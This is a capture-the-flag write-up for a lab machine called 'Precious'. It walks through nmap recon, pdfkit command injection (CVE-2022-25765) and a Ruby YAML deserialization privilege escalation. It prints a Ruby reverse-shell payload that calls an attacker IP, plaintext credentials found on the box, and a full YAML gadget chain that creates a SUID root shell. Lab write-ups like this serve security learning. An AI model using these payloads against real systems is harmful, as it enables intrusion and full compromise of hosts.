# Recon

All-tcp scan:
```bash
nmap -p- -oA scans/nmap-alltcp 10.10.11.189

PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
```

Detailed scan:
```bash
nmap -p 22,80 -sVC -oA scans/nmap-tcpdetail 10.10.11.189

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.4p1 Debian 5+deb11u1 (protocol 2.0)
| ssh-hostkey: 
|   3072 845e13a8e31e20661d235550f63047d2 (RSA)
|   256 a2ef7b9665ce4161c467ee4e96c7c892 (ECDSA)
|_  256 33053dcd7ab798458239e7ae3c91a658 (ED25519)
80/tcp open  http    nginx 1.18.0
|_http-server-header: nginx/1.18.0
|_http-title: Did not follow redirect to http://precious.htb/
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

Endpoint and subdomains enum didn't yield anything interesting.

# Shell as ruby

After we visit the site, we see only a single input field:  
![](site.png)

We use the application like a standard user. After giving it
the site we want to "convert", it makes our browser download
the resulting pdf. We will examine it's metadata:

```bash
exiftool f9agkm4cree95bnsyb4d7oqf4se8vt41.pdf

ExifTool Version Number         : 12.57
File Name                       : f9agkm4cree95bnsyb4d7oqf4se8vt41.pdf
Directory                       : .
File Size                       : 4.6 kB
File Modification Date/Time     : 2023:08:22 06:16:45-04:00
File Access Date/Time           : 2023:08:22 06:16:49-04:00
File Inode Change Date/Time     : 2023:08:22 06:16:45-04:00
File Permissions                : -rw-r--r--
File Type                       : PDF
File Type Extension             : pdf
MIME Type                       : application/pdf
PDF Version                     : 1.4
Linearized                      : No
Page Count                      : 1
Creator                         : Generated by pdfkit v0.8.6
```

As we can see, it was generated by pdfkit v0.8.6.
This version is vulnerable to CVE-2022-25765 pdfkit command injection.

We will use the POC python script available on the internet in order to
exploit this vulnerability:

```bash
python pdfkit0872-exec.py -s 10.10.14.23 9001 -w http://precious.htb -p url

        _ __,~~~/_        __  ___  _______________  ___  ___
    ,~~`( )_( )-\|       / / / / |/ /  _/ ___/ __ \/ _ \/ _ \
        |/|  `--.       / /_/ /    // // /__/ /_/ / , _/ // /
_V__v___!_!__!_____V____\____/_/|_/___/\___/\____/_/|_/____/....
    
UNICORD: Exploit for CVE-2022â€“25765 (pdfkit) - Command Injection
OPTIONS: Reverse Shell Sent to Target Website Mode
PAYLOAD: http://%20`ruby -rsocket -e'spawn("sh",[:in,:out,:err]=>TCPSocket.new("10.10.14.23","9001"))'`
LOCALIP: 10.10.14.23:9001
WARNING: Be sure to start a local listener on the above IP and port. "nc -lnvp 9001".
WEBSITE: http://precious.htb
POSTARG: url
EXPLOIT: Payload sent to website!
SUCCESS: Exploit performed action
```

In started listener we should receive reverse connection and be able
to run commands as ruby.

# Shell as henry

Elevating privieges to henry was pretty simple.
When in ruby's home directory, we noticed nonstandard directory (.bundle).
Inside it, there was a file with henry's credentials:

```
henry:Q3c1AqGHtoI0aXAYFH
```

# Shell as root

First, we check what commands can our current user run as root:
```bash
sudo -l
Matching Defaults entries for henry on precious:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User henry may run the following commands on precious:
    (root) NOPASSWD: /usr/bin/ruby /opt/update_dependencies.rb
```

Viewing the script in question:
```bash
cat /opt/uo pdate_dependencies.rb 
# Compare installed dependencies with those specified in "dependencies.yml"
require "yaml"
require 'rubygems'

# TODO: update versions automatically
def update_gems()
end

def list_from_file
    YAML.load(File.read("dependencies.yml"))
end

...SNIP...
```

We can see, that "dependencies.yml" is loaded with relative path,
which means that it's location is dependent entirely on the person
who runs the script. But, with this alone, we cannot do much.
We check the ruby version to see if it's a vulnerable one:

```bash
ruby --version
ruby 2.7.4p191 (2021-07-07 revision a21a3b7d23) [x86_64-linux-gnu]
```

This version is vulnerable exaclty to loading yaml files.
From [This Article](https://staaldraad.github.io/post/2021-01-09-universal-rce-ruby-yaml-load-updated/) we can learn how to exploit it.
In our case, we took the POC code posted in the article and changed it
to our liking:

```yaml
---
- !ruby/object:Gem::Installer
    i: x
- !ruby/object:Gem::SpecFetcher
    i: y
- !ruby/object:Gem::Requirement
  requirements:
    !ruby/object:Gem::Package::TarReader
    io: &1 !ruby/object:Net::BufferedIO
      io: &1 !ruby/object:Gem::Package::TarReader::Entry
         read: 0
         header: "abc"
      debug_output: &1 !ruby/object:Net::WriteAdapter
         socket: &1 !ruby/object:Gem::RequestSet
             sets: !ruby/object:Net::WriteAdapter
                 socket: !ruby/module 'Kernel'
                 method_id: :system
             git_set: cp /bin/bash /tmp/jjs;chmod +x /tmp/jjs;chmod +s /tmp/jjs;
         method_id: :resolve
```

We upload it to henry's home directory, and in this same directory, we
execute the sudo command:

```bash
sudo /usr/bin/ruby /opt/update_dependencies.rb
```

Then, we run:

```bash
/tmp/jjs -p
```

With our new root shell, we can read the flag:

```
81c**************************dd8
```
